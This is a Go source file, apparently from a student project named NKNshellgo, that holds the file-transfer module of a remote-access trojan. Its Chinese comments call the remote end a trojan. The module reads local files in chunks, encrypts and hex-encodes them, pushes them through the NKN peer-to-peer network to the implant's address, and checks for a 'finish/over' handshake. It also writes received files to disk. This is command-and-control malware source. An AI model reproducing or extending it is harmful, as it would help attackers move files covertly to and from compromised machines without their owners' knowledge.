package fileSender

import (
	"NKNshellgo/module/cipher"
	"NKNshellgo/module/stringReplace"
	"bufio"
	"encoding/hex"
	"github.com/nknorg/nkn-sdk-go"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

// SendFile 文件发送
func SendFile(filepath string, client *nkn.MultiClient, address string, encrypteType string) {
	//处理为合理的字符串，对\进行转义处理
	filepath = strings.Replace(filepath, "\\", "\\\\", -1)
	file, err := os.Open(filepath)
	if err != nil {
		panic(err)
	}
	defer func(file *os.File) {
		err := file.Close()
		if err != nil {

		}
	}(file)
	reader := bufio.NewReader(file)

	//chunk := make([]byte, 0)
	buf := make([]byte, 1024) //每次读取1024字节
	for {
		n, err := reader.Read(buf)
		if err != nil && err != io.EOF {
			panic(err)
		}
		//文件发送完毕，发送结束标示finish
		if 0 == n {
			message := hex.EncodeToString(cipher.CipherEncode("finish", encrypteType))
			onReply, _ := client.Send(nkn.NewStringArray(address), message, nil)
			//接收shell响应，判断木马接收文件是否完毕
			reply := <-onReply.C
			cipherResult, _ := hex.DecodeString(string(reply.Data))
			result := cipher.CipherDecode(cipherResult, encrypteType)
			result = stringReplace.RemoveEnd(result)
			if result == "over" {
				log.Println("木马接收文件完毕")
			} else {
				log.Println("木马接收文件情况未知")
			}
			break
		}
		filePart := hex.EncodeToString(cipher.CipherEncode(string(buf[:n]), encrypteType))
		onReply, _ := client.Send(nkn.NewStringArray(address), filePart, nil)
		reply := <-onReply.C
		middle, _ := hex.DecodeString(string(reply.Data))
		log.Println(cipher.CipherDecode(middle, encrypteType))
		//fmt.Println(string(buf[:n]))
		//chunk = append(chunk, buf[:n]...)
	}
	//fmt.Println(chunk)
}

// ReceiveFile 文件接收
func ReceiveFile(filepath string, content []byte) {
	err := ioutil.WriteFile(filepath, content, 0644)
	if err != nil {
		panic(err)
	}
}

//func main() {
//	sendFile("E:\\Code\\毕业设计\\NKNshellgo\\Shell\\main.exe")
//}
